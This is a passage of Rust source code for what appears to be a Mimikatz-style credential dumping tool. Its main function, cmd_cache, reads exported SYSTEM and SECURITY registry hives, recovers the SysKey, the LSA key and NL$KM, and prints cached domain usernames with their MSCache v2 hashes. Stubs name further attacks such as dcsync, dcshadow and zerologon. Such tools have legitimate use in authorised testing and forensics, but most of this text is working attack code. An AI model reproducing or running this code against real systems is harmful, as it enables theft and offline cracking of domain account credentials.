                let text = String::from_utf16_lossy(&u16_data);
                let text = text.trim_end_matches('\0');
                if !text.is_empty() {
                    println!("  {}/text: {}", prefix, text);
                    return;
                }
            }
        }
        println!("  {}/hex : {}", prefix, hex::encode(data));
        if data.len() > 32 {
            println!("  {}/hex : ({} bytes total)", prefix, data.len());
        }
    }
}

// ---------------------------------------------------------------------------
// cmd_cache — Offline cached domain credentials (NL$KM / MSCache v2)
// ---------------------------------------------------------------------------

fn cmd_cache(args: &[String]) -> Status {
    let system_path = display::find_named_arg(args, "system");
    let security_path = display::find_named_arg(args, "security");

    match (system_path, security_path) {
        (Some(system), Some(security)) => cmd_cache_offline(system, security),
        _ => {
            println!("lsadump::cache - Offline mode (hive files)");
            println!("Usage: lsadump::cache /system:SYSTEM_HIVE /security:SECURITY_HIVE");
            println!();
            println!("  /system:path    - Path to SYSTEM registry hive file");
            println!("  /security:path  - Path to SECURITY registry hive file");
            println!();
            println!("Online mode (live registry) is not yet implemented.");
            println!("Export hives with: reg save HKLM\\SYSTEM system.hiv");
            println!("                   reg save HKLM\\SECURITY security.hiv");
            Status::Unsuccessful
        }
    }
}

fn cmd_cache_offline(system_path: &str, security_path: &str) -> Status {
    println!("\nDomain : offline (hive files)");
    println!("SysKey : extracting...");

    // Step 1: Extract SysKey
    let system_hive = match HiveFile::open(system_path) {
        Ok(h) => h,
        Err(e) => {
            eprintln!("ERROR: Failed to open SYSTEM hive: {}", e);
            return Status::Unsuccessful;
        }
    };

    let syskey = match extract_syskey(&system_hive) {
        Ok(k) => k,
        Err(e) => {
            eprintln!("ERROR: Failed to extract SysKey: {}", e);
            return Status::Unsuccessful;
        }
    };

    println!("SysKey : {}", hex::encode(&syskey));

    // Step 2: Open SECURITY hive
    let security_hive = match HiveFile::open(security_path) {
        Ok(h) => h,
        Err(e) => {
            eprintln!("ERROR: Failed to open SECURITY hive: {}", e);
            return Status::Unsuccessful;
        }
    };

    let sec_root = security_hive.root_key_offset();

    // Step 3: Determine NT version
    let policy_key = match security_hive.open_key(sec_root, "Policy") {
        Ok(k) => k,
        Err(e) => {
            eprintln!("ERROR: Cannot find Policy key in SECURITY hive: {}", e);
            return Status::Unsuccessful;
        }
    };

    let is_nt6 = match security_hive.query_value(policy_key, "PolRevision") {
        Ok(rev) if rev.len() >= 4 => {
            let minor = u16::from_le_bytes([rev[0], rev[1]]);
            let major = u16::from_le_bytes([rev[2], rev[3]]);
            major >= 1 && minor >= 10
        }
        _ => true,
    };

    // Step 4: Get LSA key
    let lsa_key = match decrypt_lsa_key(&security_hive, policy_key, &syskey, is_nt6) {
        Ok(k) => k,
        Err(e) => {
            eprintln!("ERROR: Failed to decrypt LSA key: {}", e);
            return Status::Unsuccessful;
        }
    };

    // Step 5: Read and decrypt NL$KM from Cache\NL$KM
    let cache_key = match security_hive.open_key(sec_root, "Cache") {
        Ok(k) => k,
        Err(e) => {
            eprintln!("ERROR: Cannot find Cache key in SECURITY hive: {}", e);
            return Status::Unsuccessful;
        }
    };

    let nlkm_encrypted = match security_hive.query_value(cache_key, "NL$KM") {
        Ok(v) => v,
        Err(e) => {
            eprintln!("ERROR: Cannot read NL$KM value: {}", e);
            return Status::Unsuccessful;
        }
    };

    let nlkm_key = match decrypt_secret_value(&nlkm_encrypted, &lsa_key, is_nt6) {
        Ok(k) => k,
        Err(e) => {
            eprintln!("ERROR: Failed to decrypt NL$KM: {}", e);
            return Status::Unsuccessful;
        }
    };

    println!("NL$KM  : {}", hex::encode(&nlkm_key));
    println!();

    // Step 6: Enumerate cached credentials (NL$1 through NL$10+)
    let cache_subvalues: Vec<String> = (1..=10)
        .map(|i| format!("NL${}", i))
        .collect();

    let mut found_count = 0u32;

    for cache_name in &cache_subvalues {
        let cache_data = match security_hive.query_value(cache_key, cache_name) {
            Ok(v) => v,
            Err(_) => continue,
        };

        if cache_data.len() < 96 {
            continue;
        }

        // Parse MSCACHE_ENTRY header
        let username_len = u16::from_le_bytes([cache_data[0], cache_data[1]]) as usize;
        let domain_name_len = u16::from_le_bytes([cache_data[2], cache_data[3]]) as usize;
        let _effective_name_len = u16::from_le_bytes([cache_data[4], cache_data[5]]) as usize;
        let _full_name_len = u16::from_le_bytes([cache_data[6], cache_data[7]]) as usize;

        // If username_len is 0, this is an empty cache entry
        if username_len == 0 {
            continue;
        }

        found_count += 1;

        // The cached hash is at offset 0x48 (72) in the entry, 16 bytes
        // Iteration count is at offset 0x40 (64)
        let iteration_count = u32::from_le_bytes([
            cache_data[0x40],
            cache_data[0x41],
            cache_data[0x42],
            cache_data[0x43],
        ]);

        // The encrypted data starts at offset 0x60 (96)
        let enc_data_start: usize = 0x60;

        if cache_data.len() < enc_data_start + username_len + domain_name_len {
            eprintln!("  WARNING: {} data truncated", cache_name);
            continue;
        }

        // The IV for decryption is the first 16 bytes of the cached hash area
        let iv = &cache_data[0x48..0x58]; // 16 bytes at offset 0x48

        // Derive the decryption key: HMAC-MD5(NL$KM, iv)
        let hmac_key = crypto::hmac_md5(&nlkm_key, iv);

        // Decrypt the cached data using AES-128-CBC
        let enc_data = &cache_data[enc_data_start..];

        let decrypted = match crypto::aes128_cbc_decrypt(&hmac_key, &[0u8; 16], enc_data) {
            Ok(d) => d,
            Err(e) => {
                eprintln!("  WARNING: Failed to decrypt {}: {}", cache_name, e);
                continue;
            }
        };

        // Extract username and domain from decrypted data
        let username = if decrypted.len() >= username_len && username_len >= 2 {
            let u16_data: Vec<u16> = decrypted[..username_len]
                .chunks_exact(2)
                .map(|c| u16::from_le_bytes([c[0], c[1]]))
                .collect();
            String::from_utf16_lossy(&u16_data)
        } else {
            String::from("(unknown)")
        };

        // Domain starts after username (aligned to 4 bytes)
        let domain_offset = (username_len + 3) & !3; // align to 4
        let domain_name = if decrypted.len() >= domain_offset + domain_name_len
            && domain_name_len >= 2
        {
            let u16_data: Vec<u16> = decrypted[domain_offset..domain_offset + domain_name_len]
                .chunks_exact(2)
                .map(|c| u16::from_le_bytes([c[0], c[1]]))
                .collect();
            String::from_utf16_lossy(&u16_data)
        } else {
            String::from("(unknown)")
        };

        // The cached NTLM hash (mscache2 input) is in the cache_data at offset 0x48
        // Actually, for DCC2, we need the MSCache hash from the decrypted data
        // The hash itself is at offset 0x48 in the original (non-decrypted) cache_data
        let cached_hash = &cache_data[0x48..0x58];

        println!("{} :", cache_name);
        println!("  User      : {}\\{}", domain_name, username);
        println!("  MsCacheV2 : {}", hex::encode(cached_hash));
        if iteration_count > 0 {
            println!("  Iterations: {}", iteration_count);
        }
        println!();
    }

    if found_count == 0 {
        println!("  (no cached credentials found)");
    } else {
        println!("{} cached credential(s) found", found_count);
    }

    Status::Success
}

// ---------------------------------------------------------------------------
// Stub commands for unimplemented functions
// ---------------------------------------------------------------------------

fn not_impl(name: &str, _args: &[String]) -> Status {
    eprintln!("ERROR: lsadump::{} is not yet implemented", name);
    eprintln!("  This command requires live Windows API access or RPC.");
    Status::Unsuccessful
}

fn cmd_lsa(args: &[String]) -> Status {
    not_impl("lsa", args)
}

fn cmd_trust(args: &[String]) -> Status {
    not_impl("trust", args)
}

fn cmd_backupkeys(args: &[String]) -> Status {
    not_impl("backupkeys", args)
}

fn cmd_rpdata(args: &[String]) -> Status {
    not_impl("rpdata", args)
}

fn cmd_dcsync(args: &[String]) -> Status {
    not_impl("dcsync", args)
}

fn cmd_dcshadow(args: &[String]) -> Status {
    not_impl("dcshadow", args)
}

fn cmd_setntlm(args: &[String]) -> Status {
    not_impl("setntlm", args)
}

fn cmd_changentlm(args: &[String]) -> Status {
    not_impl("changentlm", args)
}

fn cmd_netsync(args: &[String]) -> Status {
    not_impl("netsync", args)
}

fn cmd_packages(args: &[String]) -> Status {
    not_impl("packages", args)
}

fn cmd_mbc(args: &[String]) -> Status {
    not_impl("mbc", args)
}

fn cmd_zerologon(args: &[String]) -> Status {
    not_impl("zerologon", args)
}

fn cmd_postzerologon(args: &[String]) -> Status {
    not_impl("postzerologon", args)
}
